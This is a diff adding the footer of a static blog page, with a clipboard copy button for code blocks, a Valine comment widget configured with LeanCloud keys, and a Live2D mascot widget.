+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'Ku71Pva4EFeKIH5y64LCYVwp-gzGzoHsz',
+            appKey: 'wqnsWKV8eVHemIwCa9vo9vRg',
+            placeholder: '快来评论一下吧',
+            avatar: 'robohash'
+        })
+    </script>
+
+    
+<!-- utterances Comments -->
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
